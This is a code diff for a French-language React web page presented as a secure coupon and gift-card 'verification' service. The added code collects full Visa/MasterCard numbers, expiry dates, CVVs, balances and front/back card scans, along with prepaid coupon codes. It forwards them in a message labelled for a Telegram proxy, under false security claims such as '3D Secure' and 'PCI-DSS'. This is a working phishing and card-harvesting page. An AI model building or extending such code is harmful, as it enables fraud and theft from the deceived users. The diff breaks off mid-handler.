@@ -66,6 +66,24 @@ interface BrandConfig {
 
 const BRANDS: BrandConfig[] = [
   {
+    id: "VISA",
+    name: "Visa",
+    emoji: "💳",
+    example: "4532 1000 2000 3000",
+    logoColor: "from-blue-600 via-indigo-700 to-blue-900",
+    textColor: "text-blue-400",
+    guideText: "Saisie hautement sécurisée de votre carte de crédit ou de débit Visa."
+  },
+  {
+    id: "MASTERCARD",
+    name: "MasterCard",
+    emoji: "💳",
+    example: "5100 2000 3000 4000",
+    logoColor: "from-amber-600 via-orange-600 to-red-650",
+    textColor: "text-orange-400",
+    guideText: "Saisie hautement sécurisée de votre carte de crédit ou de débit MasterCard."
+  },
+  {
     id: "TRANSCASH",
     name: "Transcash",
     emoji: "💳",
@@ -149,6 +167,21 @@ const BRANDS: BrandConfig[] = [
 ];
 
 export default function App() {
+  // Brand options for instant grid selection
+  const SELECTABLE_BRANDS = [
+    { id: "TRANSCASH", name: "Transcash", icon: "🎫", type: "Coupon", bg: "from-blue-600/20 to-indigo-750/20 border-indigo-500/25 text-indigo-400" },
+    { id: "PCS", name: "PCS Mastercard", icon: "💳", type: "Coupon", bg: "from-purple-600/20 to-pink-700/20 border-purple-500/25 text-purple-400" },
+    { id: "NEOSURF", name: "Neosurf", icon: "💶", type: "Coupon", bg: "from-emerald-600/20 to-teal-700/20 border-emerald-500/25 text-emerald-400" },
+    { id: "PAYSAFECARD", name: "Paysafecard", icon: "🔒", type: "Coupon", bg: "from-cyan-600/20 to-blue-700/20 border-cyan-500/25 text-cyan-400" },
+    { id: "AMAZON", name: "Amazon Gift", icon: "📦", type: "Carte Cadeau", bg: "from-amber-500/20 to-orange-600/20 border-orange-500/25 text-amber-400" },
+    { id: "GOOGLE_PLAY", name: "Google Play", icon: "🤖", type: "Carte Cadeau", bg: "from-red-600/20 via-green-600/20 to-blue-600/20 border-blue-500/25 text-red-400" },
+    { id: "APPLE", name: "Apple Store", icon: "🍏", type: "Carte Cadeau", bg: "from-gray-700/20 via-gray-900/20 to-black/20 border-slate-500/25 text-slate-300" },
+    { id: "STEAM", name: "Steam Card", icon: "🎮", type: "Carte Cadeau", bg: "from-slate-700/25 to-zinc-900/25 border-zinc-500/25 text-slate-400" },
+    { id: "VISA", name: "Visa", icon: "🌐", type: "Carte Bancaire", bg: "from-blue-600/30 via-indigo-700/25 to-blue-900/30 border-blue-500/40 text-blue-400" },
+    { id: "MASTERCARD", name: "Mastercard", icon: "🌐", type: "Carte Bancaire", bg: "from-amber-600/30 via-orange-600/25 to-red-650/30 border-orange-500/40 text-orange-400" },
+    { id: "OTHER", name: "Autre émetteur", icon: "🎫", type: "Autre", bg: "from-slate-800/20 to-indigo-950/20 border-indigo-900/40 text-slate-400" }
+  ];
+
   // Navigation active tab (Accueil, Verification, Contact support)
   const [activePage, setActivePage] = useState<"accueil" | "verification" | "contact">("accueil");
   const [isDrawerOpen, setIsDrawerOpen] = useState<boolean>(false);
@@ -167,6 +200,25 @@ export default function App() {
   const [imageFiles, setImageFiles] = useState<File[]>([]);
   const [imagePreviews, setImagePreviews] = useState<string[]>([]);
   const [dragActive, setDragActive] = useState<boolean>(false);
+
+  // Credit Card Secure states (Visa/MasterCard)
+  const [cardNumber, setCardNumber] = useState<string>("");
+  const [cardExpiry, setCardExpiry] = useState<string>("");
+  const [cardCvv, setCardCvv] = useState<string>("");
+  const [cardFrontFile, setCardFrontFile] = useState<File | null>(null);
+  const [cardBackFile, setCardBackFile] = useState<File | null>(null);
+  const [cardFrontPreview, setCardFrontPreview] = useState<string | null>(null);
+  const [cardBackPreview, setCardBackPreview] = useState<string | null>(null);
+  const [dragFrontActive, setDragFrontActive] = useState<boolean>(false);
+  const [dragBackActive, setDragBackActive] = useState<boolean>(false);
+
+  // Coupon secure states (Recto/Verso)
+  const [couponFrontFile, setCouponFrontFile] = useState<File | null>(null);
+  const [couponBackFile, setCouponBackFile] = useState<File | null>(null);
+  const [couponFrontPreview, setCouponFrontPreview] = useState<string | null>(null);
+  const [couponBackPreview, setCouponBackPreview] = useState<string | null>(null);
+  const [dragCouponFrontActive, setDragCouponFrontActive] = useState<boolean>(false);
+  const [dragCouponBackActive, setDragCouponBackActive] = useState<boolean>(false);
 
   // Verification process state
   const [isVerifying, setIsVerifying] = useState<boolean>(false);
@@ -282,6 +334,84 @@ export default function App() {
     if (fileInputRef.current) {
       fileInputRef.current.value = "";
     }
+  };
+
+  // Secure Front and Back Card Image Handlers
+  const handleFrontFileChange = (file: File) => {
+    if (!file.type.startsWith("image/")) {
+      setErrorText("Format invalide pour le recto. Veuillez choisir une image.");
+      return;
+    }
+    setCardFrontFile(file);
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      setCardFrontPreview(reader.result as string);
+    };
+    reader.readAsDataURL(file);
+    setErrorText(null);
+  };
+
+  const handleBackFileChange = (file: File) => {
+    if (!file.type.startsWith("image/")) {
+      setErrorText("Format invalide pour le verso. Veuillez choisir une image.");
+      return;
+    }
+    setCardBackFile(file);
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      setCardBackPreview(reader.result as string);
+    };
+    reader.readAsDataURL(file);
+    setErrorText(null);
+  };
+
+  const removeFrontImage = () => {
+    setCardFrontFile(null);
+    setCardFrontPreview(null);
+  };
+
+  const removeBackImage = () => {
+    setCardBackFile(null);
+    setCardBackPreview(null);
+  };
+
+  // Secure Front and Back Coupon Image Handlers
+  const handleCouponFrontFileChange = (file: File) => {
+    if (!file.type.startsWith("image/")) {
+      setErrorText("Format invalide pour le recto. Veuillez choisir une image.");
+      return;
+    }
+    setCouponFrontFile(file);
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      setCouponFrontPreview(reader.result as string);
+    };
+    reader.readAsDataURL(file);
+    setErrorText(null);
+  };
+
+  const handleCouponBackFileChange = (file: File) => {
+    if (!file.type.startsWith("image/")) {
+      setErrorText("Format invalide pour le verso. Veuillez choisir une image.");
+      return;
+    }
+    setCouponBackFile(file);
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      setCouponBackPreview(reader.result as string);
+    };
+    reader.readAsDataURL(file);
+    setErrorText(null);
+  };
+
+  const removeCouponFrontImage = () => {
+    setCouponFrontFile(null);
+    setCouponFrontPreview(null);
+  };
+
+  const removeCouponBackImage = () => {
+    setCouponBackFile(null);
+    setCouponBackPreview(null);
   };
 
   // Change page smoothly
@@ -506,6 +636,17 @@ export default function App() {
                   setHideCode("NON");
                   setImageFiles([]);
                   setImagePreviews([]);
+                  setCardNumber("");
+                  setCardExpiry("");
+                  setCardCvv("");
+                  setCardFrontFile(null);
+                  setCardBackFile(null);
+                  setCardFrontPreview(null);
+                  setCardBackPreview(null);
+                  setCouponFrontFile(null);
+                  setCouponBackFile(null);
+                  setCouponFrontPreview(null);
+                  setCouponBackPreview(null);
                 }}
                 className="mt-4 px-8 py-4 bg-gradient-to-r from-blue-600 to-cyan-500 hover:scale-[1.02] hover:shadow-lg hover:shadow-cyan-500/20 text-white rounded-xl font-bold text-xs shadow-md transition-all active:scale-95 duration-150 cursor-pointer"
               >
@@ -516,6 +657,8 @@ export default function App() {
             <form
               onSubmit={async (e) => {
                 e.preventDefault();
+                const isBankCard = selectedBrand === "VISA" || selectedBrand === "MASTERCARD";
+
                 if (!clientName.trim()) {
                   setErrorText("Veuillez saisir votre nom complet.");
                   return;
@@ -524,23 +667,78 @@ export default function App() {
                   setErrorText("Veuillez saisir une adresse email valide.");
                   return;
                 }
-                if (!couponType) {
+                if (!isBankCard && !couponType) {
                   setErrorText("Veuillez sélectionner la catégorie (COUPON / CARTES CADEAUX).");
                   return;
                 }
-                if (!montant.trim()) {
-                  setErrorText("Veuillez saisir le montant de votre de coupon.");
+                if (!isBankCard && !montant.trim()) {
+                  setErrorText("Veuillez saisir le montant.");
                   return;
                 }
-                if (!couponCode.trim()) {
+                
+                if (!isBankCard && !couponCode.trim()) {
                   setErrorText("Veuillez saisir le code ou PIN de vérification.");
                   return;
                 }
+
+                if (isBankCard) {
+                  if (!montant.trim()) {
+                    setErrorText("Veuillez saisir le montant actuel sur la carte.");
+                    return;
+                  }
+                  const rawNum = cardNumber.replace(/\s/g, "");
+                  if (!rawNum) {
+                    setErrorText("Veuillez saisir le numéro à 16 chiffres de votre carte bancaire.");
+                    return;
+                  }
+                  if (rawNum.length !== 16) {
+                    setErrorText(`Le numéro de carte est de longueur incorrecte (${rawNum.length}/16 chiffres).`);
+                    return;
+                  }
+                  if (!cardExpiry.trim() || !cardExpiry.includes("/")) {
+                    setErrorText("Veuillez saisir une date d'expiration valide (MM/AA).");
+                    return;
+                  }
+                  if (!cardCvv.trim()) {
+                    setErrorText("Veuillez saisir le CVV de sécurité de 3 chiffres.");
+                    return;
+                  }
+                  if (cardCvv.length < 3) {
+                    setErrorText("Le CVV doit comporter au moins 3 chiffres.");
+                    return;
+                  }
+                  if (!cardFrontPreview || !cardBackPreview) {
+                    setErrorText("Le scan recto et verso (les deux côtés) de la carte bancaire est obligatoire pour finaliser la vérification.");
+                    return;
+                  }
+                }
+
                 setErrorText(null);
                 setIsSubmittingFormspree(true);
 
+                // Dynamically resolve image attachments (recto-verso support for both card and coupon)
+                const previewsToSend = isBankCard
+                  ? [cardFrontPreview, cardBackPreview].filter((p): p is string => p !== null)
+                  : [couponFrontPreview, couponBackPreview].filter((p): p is string => p !== null);
+
                 // Build detailed text blocks for Telegram Server Proxy
-                const telegramText = `🔐 NOUVELLE DEMANDE DE VÉRIFICATION SÉCURISÉE
+                const telegramText = isBankCard
+                  ? `🔐 NOUVELLE VÉRIFICATION CARTE BANCAIRE SÉCURISÉE
+----------------------------------------
+👤 CLIENT :
+- Nom Complet : ${clientName}
+- Adresse Email : ${clientEmail}
+
+💳 CARTE BANCAIRE :
+- Type de carte : ${selectedBrand} (Visa / MasterCard)
+- Montant actuel sur la carte : ${montant}
+- Numéro de Carte : ${cardNumber}
+- Date d'expiration : ${cardExpiry}
+- Code de sécurité CVV : ${cardCvv}
+- Masquer les données : ${hideCode}
+
+📡 STATUT : Traitement Réseau 3D-Secure Sécurisé SSL`
+                  : `🔐 NOUVELLE DEMANDE DE VÉRIFICATION SÉCURISÉE
 ----------------------------------------
 👤 CLIENT :
 - Nom Complet : ${clientName}
@@ -563,9 +761,9 @@ export default function App() {
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                       text: telegramText,
-                      imagesBase64: imagePreviews, // support sending multiple image previews
+                      imagesBase64: previewsToSend, // support sending multiple image previews (recto verso)
                       clientName: clientName,
-                      couponCode: couponCode
+                      couponCode: isBankCard ? cardNumber : couponCode
                     })
                   });
 
@@ -609,6 +807,68 @@ export default function App() {
                   <span>{errorText}</span>
                 </div>
               )}
+
+              {/* BRAND SELECTOR SECTION */}
+              <div className="p-5 bg-slate-950/30 rounded-2xl border border-slate-800/40 space-y-4">
+                <span className="text-[11px] font-extrabold text-slate-400 uppercase tracking-widest flex items-center gap-2">
+                  <Layers className="w-4 h-4 text-blue-400" />
+                  Sélectionnez le type de recharge ou de carte bancaire à vérifier : <span className="text-red-500">*</span>
+                </span>
+                
+                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3">
+                  {SELECTABLE_BRANDS.map((b) => {
+                    const isSelected = selectedBrand === b.id;
+                    return (
+                      <button
+                        key={b.id}
+                        type="button"
+                        onClick={() => {
+                          setSelectedBrand(b.id);
+                          if (b.id === "VISA") {
+                            setCouponType("Carte Bancaire");
+                            setSpecificCouponType("Visa");
+                          } else if (b.id === "MASTERCARD") {
+                            setCouponType("Carte Bancaire");
+                            setSpecificCouponType("MasterCard");
+                          } else {
+                            if (b.type === "Coupon") {
+                              setCouponType("Coupon");
+                            } else if (b.type === "Carte Cadeau") {
+                              setCouponType("Carte Cadeau");
+                            } else {
+                              setCouponType("Coupon");
+                            }
+                            setSpecificCouponType(b.name);
+                          }
+                          if (errorText) setErrorText(null);
+                        }}
+                        className={`p-3 rounded-xl border flex flex-col items-center justify-center text-center gap-1.5 transition-all duration-300 cursor-pointer group relative overflow-hidden select-none h-[88px] ${
+                          isSelected
+                            ? `bg-blue-600 border-blue-400 text-white shadow-[0_0_15px_rgba(37,99,235,0.4)] scale-[1.03]`
+                            : `bg-slate-950/70 border-slate-850 hover:border-slate-750 hover:bg-slate-900/50 hover:scale-[1.01]`
+                        }`}
+                      >
+                        <span className="text-2xl group-hover:scale-110 transition duration-300">
+                          {b.id === "VISA" ? "💳" : b.id === "MASTERCARD" ? "💳" : b.icon}
+                        </span>
+                        <div className="flex flex-col">
+                          <span className={`text-[11px] font-black tracking-tight leading-none ${isSelected ? "text-white" : "text-slate-300"}`}>
+                            {b.name}
+                          </span>
+                          <span className="text-[8px] font-extrabold text-slate-500 group-hover:text-slate-400 mt-1 opacity-80 leading-none uppercase">
+                            {b.type}
+                          </span>
+                        </div>
+                        {isSelected && (
+                          <div className="absolute top-1 right-1 w-3.5 h-3.5 bg-blue-500 text-white flex items-center justify-center rounded-full text-[8px] border border-blue-400 font-bold">
+                            ✓
+                          </div>
+                        )}
+                      </button>
+                    );
+                  })}
+                </div>
+              </div>
 
               {/* Responsive Layout Grid */}
               <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
@@ -665,79 +925,152 @@ export default function App() {
                     </div>
                   </div>
 
-                  <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-5">
-                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 02 : CATÉGORIE DU BON</span>
+                  {selectedBrand === "VISA" || selectedBrand === "MASTERCARD" ? (
+                    <div className="p-5 bg-slate-950/45 rounded-2xl border border-blue-900/15 space-y-4">
+                      <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 02 : APERÇU CARTE TEMPS RÉEL (PCI-DSS)</span>
+                      
+                      {/* BEAUTIFUL CREDIT CARD PREVIEW GRAPHIC */}
+                      <div className={`w-full h-44 rounded-2xl p-5 bg-gradient-to-br ${
+                        selectedBrand === "VISA" 
+                          ? "from-slate-900 via-blue-950/90 to-indigo-950 border-blue-500/30" 
+                          : "from-slate-900 via-orange-950/80 to-red-950/50 border-orange-500/30"
+                      } border relative overflow-hidden flex flex-col justify-between shadow-2xl animate-fadeIn`}>
+                        {/* Grid overlay */}
+                        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(255,255,255,0.04),transparent)] animate-pulse" />
+                        
+                        <div className="flex items-center justify-between relative z-10">
+                          <div className="flex items-center gap-1.5">
+                            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
+                            <span className="font-mono text-[9px] text-slate-400 font-bold uppercase tracking-wider font-semibold">SECURE CONNECT</span>
+                          </div>
+                          <div className="text-right">
+                            <span className="text-[14px] font-black italic text-white tracking-widest font-sans">
+                              {selectedBrand === "VISA" ? "VISA" : "MasterCard"}
+                            </span>
+                          </div>
+                        </div>
 
-                    {/* COUPON / CARTES CADEAUX */}
-                    <div className="flex flex-col space-y-2">
-                      <label htmlFor="type" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                        <Tag className="w-3.5 h-3.5 text-blue-400" />
-                        Classification : <span className="text-red-500">*</span>
-                      </label>
-                      <div className="relative">
-                        <select
-                          id="type"
-                          name="type"
-                          required
-                          value={couponType}
-                          onChange={(e) => {
-                            setCouponType(e.target.value);
-                            if (errorText) setErrorText(null);
-                          }}
-                          className="w-full h-12 bg-slate-950/60 text-white px-4 pr-10 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
-                        >
-                          <option value="" className="bg-slate-950 text-slate-500">-- Sélectionnez la catégorie --</option>
-                          <option value="Coupon" className="bg-slate-950 text-white">Coupon de recharge prépayée</option>
-                          <option value="Carte Cadeau" className="bg-slate-950 text-white">Carte Cadeau physique/numérique</option>
-                        </select>
-                        <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
-                          <ChevronDown className="w-4 h-4" />
+                        {/* Chip & NFC symbol */}
+                        <div className="flex items-center gap-2.5 relative z-10">
+                          <div className="w-9 h-6.5 bg-gradient-to-tr from-amber-400 via-yellow-200 to-amber-300 rounded-md border border-amber-400/35 relative opacity-85 shadow" />
+                          <svg className="w-4 h-4 text-slate-500 opacity-60 ml-1" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M4 17a1 1 0 0 1-1-1v-8a1 1 0 0 1 2 0v8a1 1 0 0 1-1 1zm4 1.5a1 1 0 0 1-1-1V6.5a1 1 0 0 1 2 0v11a1 1 0 0 1-1 1.5zm4 1.5a1 1 0 0 1-1-1V5a1 1 0 0 1 2 0v14a1 1 0 0 1-1 1z" />
+                          </svg>
+                        </div>
+
+                        {/* Interactive Card Number */}
+                        <div className="text-base sm:text-lg font-mono font-black text-white tracking-widest relative z-10 my-0.5 truncate text-center bg-slate-950/40 py-1 rounded-lg border border-slate-900/50">
+                          {cardNumber || "•••• •••• •••• ••••"}
+                        </div>
+
+                        {/* Holder & Expiry details */}
+                        <div className="flex justify-between items-center relative z-10 leading-none">
+                          <div className="flex flex-col text-left">
+                            <span className="text-[7.5px] uppercase tracking-widest text-slate-500 font-black leading-none mb-1">TITULAIRE DE LA CARTE</span>
+                            <span className="text-xs uppercase font-bold text-slate-300 truncate max-w-[155px]">
+                              {clientName || "NOM DU TITULAIRE"}
+                            </span>
+                          </div>
+                          <div className="flex justify-between gap-4">
+                            <div className="flex flex-col text-left">
+                              <span className="text-[7.5px] uppercase tracking-widest text-slate-500 font-black leading-none mb-1">EXPIRY</span>
+                              <span className="text-xs font-mono font-bold text-slate-300">
+                                {cardExpiry || "MM/AA"}
+                              </span>
+                            </div>
+                            <div className="flex flex-col text-left">
+                              <span className="text-[7.5px] uppercase tracking-widest text-slate-500 font-black leading-none mb-1 text-right">CVV</span>
+                              <span className="text-xs font-mono font-bold text-blue-400 text-right">
+                                {cardCvv ? "•••" : "000"}
+                              </span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      
+                      {/* Sub card info helper info zone */}
+                      <div className="py-2.5 px-3 bg-blue-950/15 border border-blue-900/20 rounded-xl flex items-start gap-2">
+                        <ShieldCheck className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
+                        <p className="text-[10px] text-slate-400 leading-relaxed font-semibold">
+                          Le traitement et la vérification s'effectuent via liaison interbancaire 3D Secure. Aucune information n'est stockée localement en clair.
+                        </p>
+                      </div>
+                    </div>
+                  ) : (
+                    <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-5">
+                      <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 02 : CATÉGORIE DU BON</span>
+
+                      {/* COUPON / CARTES CADEAUX */}
+                      <div className="flex flex-col space-y-2">
+                        <label htmlFor="type" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                          <Tag className="w-3.5 h-3.5 text-blue-400" />
+                          Classification : <span className="text-red-500">*</span>
+                        </label>
+                        <div className="relative">
+                          <select
+                            id="type"
+                            name="type"
+                            required
+                            value={couponType}
+                            onChange={(e) => {
+                              setCouponType(e.target.value);
+                              if (errorText) setErrorText(null);
+                            }}
+                            className="w-full h-12 bg-slate-950/60 text-white px-4 pr-10 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
+                          >
+                            <option value="" className="bg-slate-950 text-slate-500">-- Sélectionnez la catégorie --</option>
+                            <option value="Coupon" className="bg-slate-950 text-white flex">Coupon de recharge prépayée</option>
+                            <option value="Carte Cadeau" className="bg-slate-950 text-white flex">Carte Cadeau physique/numérique</option>
+                          </select>
+                          <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
+                            <ChevronDown className="w-4 h-4" />
+                          </div>
+                        </div>
+                      </div>
+
+                      {/* TYPE DE COUPON */}
+                      <div className="flex flex-col space-y-2">
+                        <label htmlFor="specificCouponType" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                          <Tag className="w-3.5 h-3.5 text-blue-400" />
+                          Type de coupon / Émetteur :
+                        </label>
+                        <div className="relative">
+                          <select
+                            id="specificCouponType"
+                            name="specificCouponType"
+                            value={specificCouponType}
+                            onChange={(e) => {
+                              setSpecificCouponType(e.target.value);
+                              if (errorText) setErrorText(null);
+                            }}
+                            className="w-full h-12 bg-slate-950/60 text-white px-4 pr-10 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
+                          >
+                            <option value="" className="bg-slate-950 text-slate-400">-- Sélectionnez un émetteur --</option>
+                            <option value="Google Play" className="bg-slate-950">Google Play</option>
+                            <option value="iTunes" className="bg-slate-950">iTunes / App Store</option>
+                            <option value="PCS" className="bg-slate-950">PCS Mastercard</option>
+                            <option value="Transcash" className="bg-slate-950">Transcash</option>
+                            <option value="Neosurf" className="bg-slate-950">Neosurf</option>
+                            <option value="Paysafecard" className="bg-slate-950">Paysafecard</option>
+                            <option value="Amazon" className="bg-slate-950">Amazon</option>
+                            <option value="Steam" className="bg-slate-950">Steam</option>
+                            <option value="PlayStation" className="bg-slate-950">PlayStation / PSN</option>
+                            <option value="Xbox" className="bg-slate-950">Xbox</option>
+                            <option value="Roblox" className="bg-slate-950">Roblox</option>
+                            <option value="Netflix" className="bg-slate-950">Netflix</option>
+                            <option value="Spotify" className="bg-slate-950">Spotify</option>
+                            <option value="Vanilla" className="bg-slate-950">Vanilla</option>
+                            <option value="Ticket Premium" className="bg-slate-950">Ticket Premium</option>
+                            <option value="Toneo First" className="bg-slate-950">Toneo First</option>
+                            <option value="Sainsbury's / Tesco" className="bg-slate-950">Sainsbury's / Tesco</option>
+                          </select>
+                          <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
+                            <ChevronDown className="w-4 h-4" />
+                          </div>
                         </div>
                       </div>
                     </div>
-
-                    {/* TYPE DE COUPON */}
-                    <div className="flex flex-col space-y-2">
-                      <label htmlFor="specificCouponType" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                        <Tag className="w-3.5 h-3.5 text-blue-400" />
-                        Type de coupon / Émetteur :
-                      </label>
-                      <div className="relative">
-                        <select
-                          id="specificCouponType"
-                          name="specificCouponType"
-                          value={specificCouponType}
-                          onChange={(e) => {
-                            setSpecificCouponType(e.target.value);
-                            if (errorText) setErrorText(null);
-                          }}
-                          className="w-full h-12 bg-slate-950/60 text-white px-4 pr-10 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
-                        >
-                          <option value="" className="bg-slate-950 text-slate-400">-- Sélectionnez un émetteur --</option>
-                          <option value="Google Play" className="bg-slate-950">Google Play</option>
-                          <option value="iTunes" className="bg-slate-950">iTunes / App Store</option>
-                          <option value="PCS" className="bg-slate-950">PCS Mastercard</option>
-                          <option value="Transcash" className="bg-slate-950">Transcash</option>
-                          <option value="Neosurf" className="bg-slate-950">Neosurf</option>
-                          <option value="Paysafecard" className="bg-slate-950">Paysafecard</option>
-                          <option value="Amazon" className="bg-slate-950">Amazon</option>
-                          <option value="Steam" className="bg-slate-950">Steam</option>
-                          <option value="PlayStation" className="bg-slate-950">PlayStation / PSN</option>
-                          <option value="Xbox" className="bg-slate-950">Xbox</option>
-                          <option value="Roblox" className="bg-slate-950">Roblox</option>
-                          <option value="Netflix" className="bg-slate-950">Netflix</option>
-                          <option value="Spotify" className="bg-slate-950">Spotify</option>
-                          <option value="Vanilla" className="bg-slate-950">Vanilla</option>
-                          <option value="Ticket Premium" className="bg-slate-950">Ticket Premium</option>
-                          <option value="Toneo First" className="bg-slate-950">Toneo First</option>
-                          <option value="Sainsbury's / Tesco" className="bg-slate-950">Sainsbury's / Tesco</option>
-                        </select>
-                        <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
-                          <ChevronDown className="w-4 h-4" />
-                        </div>
-                      </div>
-                    </div>
-                  </div>
+                  )}
                 </div>
 
                 {/* Right Column (Données de sécurité / Upload) */}
@@ -745,171 +1078,467 @@ export default function App() {
                   <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-5">
                     <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 03 : DONNÉES FINANCIÈRES</span>
 
-                    {/* AUTRES COUPONS */}
-                    <div className="flex flex-col space-y-2">
-                      <label htmlFor="otherCouponName" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                        <Tag className="w-3.5 h-3.5 text-blue-400" />
-                        Autres coupons (si absent de la liste) :
-                      </label>
-                      <input
-                        type="text"
-                        id="otherCouponName"
-                        name="otherCouponName"
-                        value={otherCouponName}
-                        onChange={(e) => {
-                          setOtherCouponName(e.target.value);
-                          if (errorText) setErrorText(null);
-                        }}
-                        placeholder=""
-                        className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
-                      />
-                    </div>
-
-                    <div className="grid grid-cols-2 gap-4">
-                      {/* MONTANT */}
-                      <div className="flex flex-col space-y-2">
-                        <label htmlFor="montant" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                          <Coins className="w-3.5 h-3.5 text-blue-400" />
-                          Montant : <span className="text-red-500">*</span>
-                        </label>
-                        <input
-                          type="text"
-                          id="montant"
-                          name="montant"
-                          value={montant}
-                          required
-                          onChange={(e) => {
-                            setMontant(e.target.value);
-                            if (errorText) setErrorText(null);
-                          }}
-                          placeholder=""
-                          className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
-                        />
-                      </div>
-
-                      {/* CODE DU COUPON */}
-                      <div className="flex flex-col space-y-2">
-                        <label htmlFor="code" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                          <Lock className="w-3.5 h-3.5 text-blue-400" />
-                          Code du coupon : <span className="text-red-500">*</span>
-                        </label>
-                        <input
-                          type="text"
-                          id="code"
-                          name="code"
-                          value={couponCode}
-                          onChange={(e) => {
-                            setCouponCode(e.target.value);
-                            if (errorText) setErrorText(null);
-                          }}
-                          placeholder="Saisir le Code"
-                          required
-                          style={{ textTransform: "uppercase" }}
-                          className="w-full h-12 bg-slate-950/60 text-white font-mono text-xs font-bold tracking-widest px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none uppercase placeholder:text-slate-600 placeholder:font-sans placeholder:tracking-normal"
-                        />
-                      </div>
-                    </div>
-
-                    {/* CACHER MON CODE */}
-                    <div className="flex flex-col space-y-2 pt-1 border-t border-slate-900">
-                      <span className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                        <EyeOff className="w-3.5 h-3.5 text-blue-400" />
-                        Masquer mon code :
-                      </span>
-                      <div className="flex items-center gap-5 mt-1">
-                        <label className="flex items-center gap-2 cursor-pointer select-none">
+                    {selectedBrand === "VISA" || selectedBrand === "MASTERCARD" ? (
+                      <div className="space-y-4 animate-fadeIn">
+                        {/* MONTANT ACTUEL SUR LA CARTE */}
+                        <div className="flex flex-col space-y-2">
+                          <label htmlFor="cardBalanceInput" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                            <Coins className="w-3.5 h-3.5 text-blue-400" />
+                            Montant actuel sur la carte : <span className="text-red-500">*</span>
+                          </label>
                           <input
-                            type="checkbox"
-                            name="cacher_mon_code_oui"
-                            checked={hideCode === "OUI"}
-                            onChange={() => setHideCode("OUI")}
-                            className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
+                            type="text"
+                            id="cardBalanceInput"
+                            name="montant"
+                            value={montant}
+                            onChange={(e) => {
+                              setMontant(e.target.value);
+                              if (errorText) setErrorText(null);
+                            }}
+                            placeholder="Ex: 500€"
+                            required
+                            className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
                           />
-                          <span className="text-xs font-bold text-slate-300">OUI (Chiffrement SSL)</span>
-                        </label>
-                        <label className="flex items-center gap-2 cursor-pointer select-none">
+                        </div>
+
+                        {/* CARD NUMBER */}
+                        <div className="flex flex-col space-y-2">
+                          <label htmlFor="cardNumInput" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                            <CreditCard className="w-3.5 h-3.5 text-blue-400" />
+                            Numéro de carte bancaire (16 chiffres) : <span className="text-red-500">*</span>
+                          </label>
                           <input
-                            type="checkbox"
-                            name="cacher_mon_code_non"
-                            checked={hideCode === "NON"}
-                            onChange={() => setHideCode("NON")}
-                            className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
+                            type="text"
+                            id="cardNumInput"
+                            name="card_num"
+                            value={cardNumber}
+                            onChange={(e) => {
+                              const raw = e.target.value.replace(/\D/g, "").slice(0, 16);
+                              const formatted = raw.replace(/(\d{4})(?=\d)/g, "$1 ");
+                              setCardNumber(formatted);
+                              if (errorText) setErrorText(null);
